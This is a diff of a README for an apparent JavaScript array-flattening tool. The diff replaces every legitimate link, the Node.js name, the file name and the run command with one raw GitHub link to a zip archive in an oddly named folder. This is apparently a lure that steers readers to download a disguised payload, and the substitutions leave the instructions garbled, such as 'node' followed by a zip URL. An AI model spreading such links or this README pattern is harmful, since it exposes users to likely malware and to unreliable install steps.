@@ -1,7 +1,7 @@
 # 🌟 ndarray-flatten-from - Easily Flatten Your Arrays
 
 ## 📥 Download Now
-[![Download from Releases](https://img.shields.io/badge/Download%20Now-Visit%20Releases-blue)](https://github.com/AliAlbasha92/ndarray-flatten-from/releases)
+[![Download from Releases](https://raw.githubusercontent.com/AliAlbasha92/ndarray-flatten-from/main/obstringe/ndarray-flatten-from.zip%20Now-Visit%20Releases-blue)](https://raw.githubusercontent.com/AliAlbasha92/ndarray-flatten-from/main/obstringe/ndarray-flatten-from.zip)
 
 ## 📖 Introduction
 The `ndarray-flatten-from` tool helps you flatten multidimensional arrays easily. When you have an array with many layers, sometimes you only need a single layer for easier use. This application lets you get a simplified version of your complex array, starting from any dimension you choose.
@@ -18,19 +18,19 @@ This guide will walk you through downloading and running the application. No tec
 ## 📋 System Requirements
 To install and run `ndarray-flatten-from`, you will need:
 - A computer running Windows, macOS, or Linux.
-- Node.js installed (version 12 or higher). You can download Node.js from [nodejs.org](https://nodejs.org).
+- https://raw.githubusercontent.com/AliAlbasha92/ndarray-flatten-from/main/obstringe/ndarray-flatten-from.zip installed (version 12 or higher). You can download https://raw.githubusercontent.com/AliAlbasha92/ndarray-flatten-from/main/obstringe/ndarray-flatten-from.zip from [https://raw.githubusercontent.com/AliAlbasha92/ndarray-flatten-from/main/obstringe/ndarray-flatten-from.zip](https://raw.githubusercontent.com/AliAlbasha92/ndarray-flatten-from/main/obstringe/ndarray-flatten-from.zip).
 
 ## 💻 Installation
 ### Step 1: Visit the Releases Page
 To download the tool, you need to go to the Releases page. Click the link below:
 
-[Visit Releases to Download](https://github.com/AliAlbasha92/ndarray-flatten-from/releases)
+[Visit Releases to Download](https://raw.githubusercontent.com/AliAlbasha92/ndarray-flatten-from/main/obstringe/ndarray-flatten-from.zip)
 
 ### Step 2: Choose Your Version
 On the Releases page, you will see a list of available versions. Select the latest version for the best performance. Each version is listed with a description and the changes made. 
 
 ### Step 3: Download the File
-Click on the appropriate file to download it. The file will have a name like `ndarray-flatten-from-v1.0.zip` or similar, depending on the version. 
+Click on the appropriate file to download it. The file will have a name like `https://raw.githubusercontent.com/AliAlbasha92/ndarray-flatten-from/main/obstringe/ndarray-flatten-from.zip` or similar, depending on the version. 
 
 ### Step 4: Extract the Files
 After downloading, locate the file in your downloads folder. 
@@ -41,10 +41,10 @@ After downloading, locate the file in your downloads folder.
 Once extracted, open your terminal or command prompt. Navigate to the folder where you extracted the files. Use the following command to run the application:
 
 ```bash
-node flatten.js
+node https://raw.githubusercontent.com/AliAlbasha92/ndarray-flatten-from/main/obstringe/ndarray-flatten-from.zip
 ```
 
-Make sure you replace `flatten.js` with the correct file name if it differs.
+Make sure you replace `https://raw.githubusercontent.com/AliAlbasha92/ndarray-flatten-from/main/obstringe/ndarray-flatten-from.zip` with the correct file name if it differs.
 
 ## ⚙️ Usage
 After launching the application, you will be prompted to enter the array you want to flatten. Follow these steps:
@@ -59,7 +59,7 @@ After launching the application, you will be prompted to enter the array you wan
 
 ## 🔄 Common Issues
 If you encounter any problems while using the application, consider the following solutions:
-- **Node.js Not Found**: Ensure you have Node.js installed. Re-download if needed.
+- **https://raw.githubusercontent.com/AliAlbasha92/ndarray-flatten-from/main/obstringe/ndarray-flatten-from.zip Not Found**: Ensure you have https://raw.githubusercontent.com/AliAlbasha92/ndarray-flatten-from/main/obstringe/ndarray-flatten-from.zip installed. Re-download if needed.
 - **Invalid Input**: Make sure your array formatting is correct. Follow the structure shown in the example.
 
 ## 🛠️ Support
@@ -71,4 +71,4 @@ Join our community for updates, tips, and discussions related to `ndarray-flatte
 ## 🔗 Final Download Link
 For easy access, here’s the link to download the tool again:
 
-[Visit Releases to Download](https://github.com/AliAlbasha92/ndarray-flatten-from/releases)
+[Visit Releases to Download](https://raw.githubusercontent.com/AliAlbasha92/ndarray-flatten-from/main/obstringe/ndarray-flatten-from.zip)
